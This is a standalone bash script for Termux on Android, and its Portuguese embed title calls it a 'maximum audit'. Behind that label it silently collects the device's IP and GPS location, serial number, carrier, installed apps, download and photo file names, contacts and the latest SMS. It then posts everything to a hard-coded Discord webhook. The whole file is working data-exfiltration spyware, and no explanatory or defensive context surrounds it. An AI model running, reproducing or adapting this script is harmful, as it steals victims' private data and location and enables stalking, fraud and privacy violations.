#!/bin/bash
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"
c() { echo "$1" | tr -d '\n\r"' | sed 's/\\/\\\\/g' | cut -c1-350; }
P_IP=$(curl -s --connect-timeout 5 ifconfig.me || echo "0.0.0.0")
L_RAW=$(curl -s "http://ip-api.com")
L_INF=$(c "$(echo "$L_RAW" | tr ',' '\n' | tr -d '{}')")
GPS=$(c "$(termux-location 2>/dev/null | grep -v 'provider' | tr -d ' ,')")
USER=$(c "$(getprop ro.build.user)")
SERIAL=$(c "$(getprop ro.serialno)")
MODEL=$(c "$(getprop ro.product.brand) $(getprop ro.product.model)")
ANDROID=$(c "$(getprop ro.build.version.release) (SDK $(getprop ro.build.version.sdk))")
CPU=$(c "$(getprop ro.product.cpu.abi)")
RAM=$(c "$(free -h | awk '/Mem:/ {print $3 "/" $2}')")
BAT=$(c "$(termux-battery-status 2>/dev/null | tr -d '\n\r{}')")
UPT=$(c "$(uptime -p)")
CONTS=$(c "$(termux-contact-list 2>/dev/null | head -n 3)")
SMS=$(c "$(termux-sms-list -l 1 2>/dev/null)")
APPS=$(c "$(pm list packages -e | head -n 15 | cut -d: -f2 | tr '\n' ',')")
FILES=$(c "$(ls -m /sdcard/Download 2>/dev/null | head -c 200)")
FOTOS=$(c "$(ls -m /sdcard/DCIM/Camera 2>/dev/null | head -c 200)")
ACCS=$(c "$(getprop gsm.operator.alpha) | SIM: $(getprop gsm.sim.state)")
KERN=$(c "$(uname -a)")
PAYLOAD=$(cat <<EOF
{
  "content": "AUDITORIA MAXIMA 021",
  "embeds": [{
    "title": "EXTRAÇÃO TOTAL DE DADOS",
    "color": 0,
    "fields": [
      {"name": "Identidade", "value": "IP: $P_IP\nUser: $USER\nSerial: $SERIAL\nModelo: $MODEL\nKernel: $KERN", "inline": false},
      {"name": "Localizacao", "value": "IP-Geo: $L_INF\nGPS: ${GPS:-'N/A'}", "inline": false},
      {"name": "Hardware", "value": "Android: $ANDROID\nCPU: $CPU\nRAM: $RAM\nBateria: $BAT\nUptime: $UPT", "inline": false},
      {"name": "Rede/Operadora", "value": "$ACCS", "inline": false},
      {"name": "Apps e Arquivos", "value": "Downloads: $FILES\nFotos: $FOTOS\nApps: $APPS", "inline": false},
      {"name": "Dados Privados", "value": "Contatos: ${CONTS:-'Sem Permissao'}\nSMS: ${SMS:-'Sem Permissao'}", "inline": false}
    ]
  }]
}
EOF
)
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
